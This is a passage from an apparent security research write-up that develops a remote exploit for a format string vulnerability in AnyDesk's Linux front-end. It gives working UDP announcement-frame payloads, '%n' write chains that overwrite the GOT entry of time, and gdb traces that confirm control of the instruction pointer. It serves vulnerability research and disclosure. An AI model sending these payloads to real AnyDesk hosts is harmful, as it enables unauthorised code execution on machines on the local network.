The first goal we need to achieve is to control the instruction pointer. Since there is `No RELRO`, we can use the `%n` format specifier to overwrite an entry within the `Global Offset Table` (`GOT`). As the heap segment, where our input data will be stored, is actually executable, we can store a shellcode there and make the `GOT` entry point to this shellcode. On the next call of the function, which `GOT` entry we overwrote, our shellcode is executed.

Although these steps sound quite straight forward, achieving this turned out to be a little bit more challenging. Let’s have a look.

## The v in vsnprintf

The next instruction after the vulnerable call to `vsnprintf` is a call to the function `time`. Accordingly we can overwrite the `GOT` entry of `time` and thus redirecting the control flow immediately after the `vsnprintf` call. In order to use the `%n` format specifier to overwrite the `GOT` entry of `time`, we need to be able to reference the address of the `GOT` entry. In a classical format string exploit this is achieved by being able to control data on the stack. Since all values on the stack, which are equal or below to the current `RSP`, can be referenced with an appropriate argument selector (e.g. `%35$n`), the desired address can simply be put into the controlled stack data. Using the appropriate argument selector in combination with the `%n` format specifier causes the function to write the amount of characters written so far to this address.

In this case things are a little bit different. As you probably already noticed the vulnerable call is **not** made to the function `snprintf`, which signature looks like this:

```

snprintf(char *s, size_t n, const char *format, ...)

```

…, but rather `vsnprintf`, which signature looks like this:

```

vsnprintf(char *s, size_t n, const char *format, va_list arg)

```

The difference here is that the format string arguments are not directly passed as variable arguments (`...`), but within a `va_list` parameter (`arg`). Each of the functions in the printf family has a corresponding `va_list` function beginning with the letter `v`:

```

user@w00d:~$ man 3 printf
...

       #include <stdio.h>

       int printf(const char *format, ...);
       int fprintf(FILE *stream, const char *format, ...);
       int dprintf(int fd, const char *format, ...);
       int sprintf(char *str, const char *format, ...);
       int snprintf(char *str, size_t size, const char *format, ...);

       #include <stdarg.h>

       int vprintf(const char *format, va_list ap);
       int vfprintf(FILE *stream, const char *format, va_list ap);
       int vdprintf(int fd, const char *format, va_list ap);
       int vsprintf(char *str, const char *format, va_list ap);
       int vsnprintf(char *str, size_t size, const char *format, va_list ap);

```

The structure of `va_list` is actually specific to the `Application Binary Interface` (`ABI`), which e.g. describes the calling convention, how the stack is organized and so on. On `x86`, where all function parameters are passed on the stack, `va_list` simply consists of a pointer to the stack area, where the original parameters are stored. With `x64` things get a little bit more complex. The first six parameters are passed in registers (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`), also there are special registers for floating point parameters (`XMM0` … `XMM7`). Additional parameters are passed on the stack as with `x86`. There is a very good blog post describing the details, which can be found [here](https://blog.nelhage.com/2010/10/amd64-and-va_arg/). The structure of the `va_list` looks like this on `x64`:

```

typedef struct {
  unsigned int gp_offset;
  unsigned int fp_offset;
  void *overflow_arg_area;
  void *reg_save_area;
} va_list[1];

```

There are two pointers: `overflow_arg_area`, which points to the first argument originally passed on the stack and `reg_save_area`, which points to an area on the stack where the arguments passed via registers are saved (the first six general parameters as well as eight floating point parameters). Both values `gp_offset` and `fp_offset` are offsets relative to `reg_save_arena` and reference the first general register parameter (`gp_offset`) as well as the first floating point parameter (`fp_offset`). These offsets exists because there are usually other parameters before the variable parameters (e.g. the format string itself).

Let’s have a practical look at this on the AnyDesk front-end. We attach gdb to it and set a breakpoint on the call to `vsnprintf`:

```

user@w00d:~$ sudo gdb /usr/bin/anydesk $(~/pid_frontend.py)
...
Attaching to program: /usr/bin/anydesk, process 3863
...
gdb-peda$ b *0x8ab346
Breakpoint 1 at 0x8ab346
gdb-peda$ c
Continuing.

```

Now we can use the python function again, which we created to generate announcement frames. In this case we send an announcement with the following hostname:

```

p = gen_discover_packet(4919, 1, '\x85\xfe 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p', 'custom username', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

The beginning of the hostname (`'\x85\xfe'`) is an invalid UTF-8 sequence, which will trigger the format string vulnerability (any other invalid UTF-8 sequence can be used here). After this we use the `%p` format specifier to print the values of the first ten arguments.

A few seconds after running the script (up to 5 seconds until the GUI refreshes) our breakpoint is hit:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffff81
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1453d80 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x20fe85272064696c
0016| 0x7ffffffeab00 --> 0x158cba0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x20fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138ca30 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1572280 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$

```

The fourth parameter (`RCX = 0x7ffffffeb898`) is the `va_list` structure. The first two unsigned ints (4 bytes each) are the members `gp_offset` and `fp_offset`:

```

gdb-peda$ x/2xw 0x7ffffffeb898
0x7ffffffeb898:	0x00000010	0x00000030

```

After these values both pointers `overflow_arg_area` and `reg_save_area` follow:

```

gdb-peda$ x/2xg 0x7ffffffeb898+8
0x7ffffffeb8a0:	0x00007ffffffeb970	0x00007ffffffeb8b0

```

Since the value of `gp_offset` is 0x10, the function which was originally called with variable arguments had two preceding general parameters. In order to display the next four general parameters assumed to be passed in the remaining registers, we need to add `gp_offset` (`0x10`) to the `reg_save_area` pointer (`0x00007ffffffeb8b0`):

```

gdb-peda$ x/4xg 0x00007ffffffeb8b0+0x10
0x7ffffffeb8c0:	0x0000000001453d80	0x0000000000000000
0x7ffffffeb8d0:	0x00007ffff1784c40	0x0000000000000010

```

`vsnprintf` assumes that these four values were passed in registers. All following values are assumed to be passed via the stack and are referenced by the `overflow_arg_area` pointer (`0x00007ffffffeb970`):

```

gdb-peda$ x/6xg 0x00007ffffffeb970
0x7ffffffeb970:	0x0000000000b366d8	0x0000000000000000
0x7ffffffeb980:	0x0000000001482b01	0x00007ffff5e4ee24
0x7ffffffeb990:	0x0000000001453d80	0x0000000000000000

```

By entering `ni` the call to `vsnprintf` is made and we can inspect the resulting string (`set print elements 0` displays the whole string without truncation):

```

gdb-peda$ ni
...
gdb-peda$ set print elements 0
gdb-peda$ x/s 0x7ffffffeafd0
0x7ffffffeafd0:	"Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.0x1453d80 2.(nil) 3.0x7ffff1784c40 4.0x10 5.0xb366d8 6.(nil) 7.0x1482b01 8.0x7ffff5e4ee24 9.0x1453d80 10.(nil)'"

```

The first four parameters were indeed taken from the `reg_save_area` and all following values from the `overflow_arg_arena`. The following picture summarizes the structure:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_05-1.png)

## Gaining arbitrary write

After we have clarified what we can access with the format string, we need to find some data that we can control in the accessible data. If we can directly control data within the `reg_save_area` or `overflow_arg_area`, we could store the address of the `time GOT` entry and write to it using the `%n` format specifier.

Within the `reg_save_area` there are only 4 values we can access. These do obviously not contain any data of our input. All following parameters are stored in the `overflow_arg_area`. Let’s have a look at the first 50 values stored there using the `telescope` command:

```

gdb-peda$ telescope 0x00007ffffffeb970 50
0000| 0x7ffffffeb970 --> 0xb366d8 --> 0x62696c67 ('glib')
0008| 0x7ffffffeb978 --> 0x0
0016| 0x7ffffffeb980 --> 0x1530801 --> 0xe000007ffff17853
0024| 0x7ffffffeb988 --> 0x7ffff5e4ee24 (test   eax,eax)
0032| 0x7ffffffeb990 --> 0x167ec00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1,%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
0040| 0x7ffffffeb998 --> 0x0
0048| 0x7ffffffeb9a0 --> 0x10
0056| 0x7ffffffeb9a8 --> 0x7ffff5e501cd (<g_logv+605>:	mov    eax,r14d)
0064| 0x7ffffffeb9b0 --> 0x7ffff7a5389b --> 0x4b544700006b7447 ('Gtk')
0072| 0x7ffffffeb9b8 --> 0x167ec00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1,%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
0080| 0x7ffffffeb9c0 --> 0x1fffeb9d0
0088| 0x7ffffffeb9c8 --> 0x4342b0 (push   rbp)
0096| 0x7ffffffeb9d0 --> 0x0
0104| 0x7ffffffeb9d8 --> 0x7ffff7a5389b --> 0x4b544700006b7447 ('Gtk')
0112| 0x7ffffffeb9e0 --> 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
0120| 0x7ffffffeb9e8 --> 0x0
0128| 0x7ffffffeb9f0 --> 0x155dd20 --> 0x7fffdc00f3d0 --> 0x1514300 --> 0x1513da0 --> 0x14d6e00 (--> ...)
0136| 0x7ffffffeb9f8 --> 0x0
0144| 0x7ffffffeba00 --> 0x500000000
0152| 0x7ffffffeba08 --> 0x7ffff5e9acd8 ("Invalid UTF-8 encoded text in name - not valid '%s'")
0160| 0x7ffffffeba10 --> 0x0
0168| 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
0176| 0x7ffffffeba20 --> 0x7ffff5e969e1 --> 0x4600303262696c67 ('glib20')
...

```

We can see a few occurrences of the heap address of the format string. Although we control parts of the format string, we don’t control the address, which is what we would need to. Searching even further down the stack for possible data we can control does not yield anything useful. So it seems that we can’t control any data, which we can access with the format string. Is this already a dead end? Of course not!

Taking a look at the values above again, we can see that there are stack addresses stored on the stack. There are even stack addresses, which reference the area we can access. For example at offset `112` the stack address `0x7ffffffeba18` is stored, which corresponds to offset `168`:

```

...
0112| 0x7ffffffeb9e0 --> 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
...
0168| 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
...

```

If we use the appropriate argument selector we can use this stack address to write to the area we can access. We can then use another argument selector to reference the data we wrote. The following picture visualizes the basic idea:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_06-1.png)

The problem here is that we cannot do this in a single call of `vsnprintf`. All referenced data is fetched **before** data is written by the `%n` format specifier. This means that the `%19$ln` would indeed overwrite the data on the stack, but the `%26$ln` would still evaluate to the old value, which was stored there. Accordingly we need two calls:

1. Store address of `time` `GOT` entry on the stack
2. Write to previously stored `GOT` entry address in order to control instruction pointer

As you may remember, the vulnerable call to `vsnprintf` is actually made twice for the very same format string. Though it turned out that the call path for both of these calls vary. Because of this also the stack layout varies. This means that an argument selector (e.g. `%26$ln`) on the first call will not reference the same value on the second call. We also need to keep in mind that we cannot change the format string in-between the two calls. If we e.g. use `%200$n` on the first call, to write the `GOT` address on the stack, we need to ensure that `%200$n` on the second call also references a writable address, because we trigger a segmentation fault otherwise. This is not only true for `%n` we use to store the `GOT` address but also for the second `%n`, we need to use in order to actually write to the `GOT` entry. Unfortunately there did not seem to be any values on the stack, which would fulfill these requirements.

Thus we need another approach. The first thing that came into my mind was to send two independent announcement frames. We need to trigger the vulnerability twice, so let’s just trigger it twice via the initial attack vector. Because of the duplicate call this actually results in four calls to `vsnprintf`. We still must ensure that the `%n` used on the respective first call also references a writable memory location on the associated second call, but since we only need to use one `%n` format specifier in each pair of calls, stack values can be found to fulfill this requirement.

Although the approach using two separate announcement frames seemed to work, I did not really like it. One reason for this is the duplicate call of `vsnprintf`. We must accept that the second call writes somewhere into memory even though it is not relevant for our exploit. Also the two announcement frames may interfere with legitimate announcement frames, which are sent in the same time window (the GUI gets updated only every 5 seconds). These aspects may reduce the reliability of the exploit.

While thinking about this and looking at the GUI another idea came into my mind:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_02.png)

The GUI displays not only the hostname, but also the username. So far we triggered the vulnerability only by using the hostname. But the username should also be prone to this. Let’s verify this by sending the following announcement frame:

```

p = gen_discover_packet(4919, 1, '\x85\xfeHOSTNAME %p', '\x85\xfeUSERNAME %p', 'ad', 'main')

```

After a few seconds the GUI updates and the breakpoint on the `vsnprintf` call is hit:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 47: Invalid UTF-8 encoded text in name - not valid '\205\376USERNAME %p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010

```

Inspecting the format string (third parameter) we can see that the username indeed triggered the vulnerability. After continuing the execution the breakpoint is hit again:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 47: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010

```

This time the vulnerability was triggered by the hostname. If we further continue the execution both calls (for username and hostname) are repeated.

Thus we verified that the vulnerability can be triggered using both the hostname and the username. This is a good news for our exploit because we can now use two independent format strings, which are sent in a single UDP packet and are both evaluated before the duplicate call is triggered.

What we have to do now is to find an accessible stack address, which we will write the `GOT` address to. For this we must keep in mind that the values on the stack between the two `vsnprintf` calls may change / get overwritten. If we write to an stack address, which is too near to the top of the stack, it is very likely that it has been overwritten at the time of the second call. Finding a suitable value is only a matter of try and error. We write to an address on the first call and then verify that the value we wrote is still the same on the second call.

The stack address `0x7ffffffebe70`, which can be accessed using the argument selector `%93$ln` fits our needs:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376USERNAME %93$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0016| 0x7ffffffeab00 --> 0x171f0c0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138b230 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1715ca0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 2, 0x00000000008ab346 in ?? ()
gdb-peda$ telescope 0x00007ffffffeb970 100
...
0704| 0x7ffffffebc30 --> 0x7ffffffebe70 --> 0x6ffffec070
...

```

After the first call the value `0x90` (the characters written so far) is written to `0x7ffffffebe70`:

```

gdb-peda$ ni
...
[-------------------------------------code-------------------------------------]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
   0x8ab346:	call   0x412d90 <vsnprintf@plt>
=> 0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
   0x8ab35c:	call   0x4123d0 <gettimeofday@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0016| 0x7ffffffeab00 --> 0x171f0c0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138b230 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1715ca0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000008ab34b in ?? ()
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000000000000090

```

When the breakpoint is hit again on the second call, the value is still the same:

```

gdb-peda$ c
Continuing.
...
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %165$p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2249 ('I"')
0008| 0x7ffffffeaaf8 --> 0x2bc
0016| 0x7ffffffeab00 --> 0x158c710 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbad94
0032| 0x7ffffffeab10 --> 0x5ecbad94
0040| 0x7ffffffeab18 --> 0xab240
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000000000000090

```

On the second call we can access the value using the argument selector `%165$p` (offset `1280`):

```

gdb-peda$ telescope 0x00007ffffffeb970 200
...
1280| 0x7ffffffebe70 --> 0x90
...

```
## Controlling the instruction pointer

Now we are finally ready to overwrite the `GOT` entry of `time`. At first let’s determine the address of the `GOT` entry:

```

gdb-peda$ p/x &'time@got.plt'
$1 = 0x119ddc0

```

Accordingly the `GOT` entry of `time` is stored at `0x119ddc0`. In order to write this value, we can pad the output of `vsnprintf` accordingly using a `field width`. If you are not familiar with this, please refer to my writeup on [RPISEC/MBE lab04B](https://devel0pment.de/?p=351#lab4B). The error message itself (`Failed to set text from markup ...`) contains 133 characters. Also we need to add two characters for an invalid UTF-8 sequence. Thus we have to pad the output to `18472249` characters:

```

0x119ddc0 = 18472384 (time GOT)
18472384 - 133 - 2 = 18472249

```

Let’s verify this by sending the following announcement frame:

```

p = gen_discover_packet(4919, 1, '\x85\xfeHOSTNAME %165$p', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After the first call to `vsnprintf` the target stack address (`0x7ffffffebe70`) actually contains the `GOT` address of `time`:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 52: Invalid UTF-8 encoded text in name - not valid '\205\376%18472249x%93$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
...
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000006ffffec070
gdb-peda$ ni
...
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x000000000119ddc0

```

The `%165$p` format specifier on the second call successfully references the `GOT` address:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %165$p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
...
gdb-peda$ ni
gdb-peda$ x/s 0x7ffffffeafd0
0x7ffffffeafd0:	"Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME 0x119ddc0'"

```

The next step is to replace the `%p` format specifier with `%ln` in order to write a 8 byte value to the `GOT` entry on the second call. This way we should be able to control the instruction pointer, when the call to `time` is triggered after the `vsnprintf` call. Let’s verify this by writing the value `0x1337`:

```

0x1337 = 4919
4919 - 133 - 2 = 4784

```

This time we adjust the hostname accordingly:

```

p = gen_discover_packet(4919, 1, '\x85\xfe%4784x%165$ln', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After sending the frame and continuing to the second call to `vsnprintf`, to `GOT` entry of `time` is still untouched:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2743 ("C'")
0008| 0x7ffffffeaaf8 --> 0x357
0016| 0x7ffffffeab00 --> 0x158cf10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbb8cc
0032| 0x7ffffffeab10 --> 0x5ecbb8cc
0040| 0x7ffffffeab18 --> 0xd0f51
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00007ffff7ffb930

```

By executing the `vsnprintf` call the value `0x1337` is successfully written:

```

gdb-peda$ ni
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x0000000000001337

```

If we now continue the execution, the immediately following call to `time` raises a segmentation fault with the instruction pointer being `0x1337`:

```

gdb-peda$ c
Continuing.

Thread 1 "anydesk" received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x1338
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x0
RDX: 0x0
RSI: 0x7ffff1784ca0 --> 0x16c1400 --> 0x276e00 ('')
RDI: 0x7ffffffeab08 --> 0x5ecbb8cc
RBP: 0x5
RSP: 0x7ffffffeaae8 --> 0x8ab355 (lea    rdi,[rsp+0x20])
RIP: 0x1337
R8 : 0x1
R9 : 0x6e ('n')
R10: 0x1
R11: 0xa ('\n')
R12: 0x7ffffffeb898 --> 0x3000000018
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1453ea0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
R15: 0x4
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x1337
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaae8 --> 0x8ab355 (lea    rdi,[rsp+0x20])
0008| 0x7ffffffeaaf0 --> 0x2743 ("C'")
0016| 0x7ffffffeaaf8 --> 0x357
0024| 0x7ffffffeab00 --> 0x158cf10 --> 0x0
0032| 0x7ffffffeab08 --> 0x5ecbb8cc
0040| 0x7ffffffeab10 --> 0x5ecbb8cc
0048| 0x7ffffffeab18 --> 0xd0f51
0056| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000001337 in ?? ()

```

We successfully control the instruction pointer.

## Hitting our shellcode: dynamic field width

At next we must decide where we want to point the instruction pointer to. At the very beginning we figured out, that the security mechanisms of the binary are quite weak. Actually the heap, where the format string we control is stored, is executable:

```

gdb-peda$ vmmap 0x1453ea0
Start              End                Perm	Name
0x011c4000         0x017c8000         rwxp	[heap]

```

This means that we can store a shellcode within the format string and redirect the instruction pointer to this shellcode. Though we need to keep in mind that we manually disabled ASLR and in fact don’t know any heap address. A common approach to bypass ALSR is to leak a memory address. Especially for basic format string vulnerabilities this is an easy to achieve goal. In this case however we don’t get any response from the application. The result of the format string is written to the log file, which we don’t have access to. Thus we cannot leak any heap address.

Nevertheless we can successfully bypass ASLR using a `dynamic field width`. Since this does not seem to be very well-known, let’s have a look at a short example. We have already used the ordinary `field width` in order to pad the output effectively increasing the amount of characters written, which makes `%n` write a bigger value:

```

user@w00d:~$ cat sample1.c
#include <stdio.h>

int main() {

  int out;
  printf("%100x%1$n", &out);
  printf("\nout = %d\n", out);

  return 0;
}

```

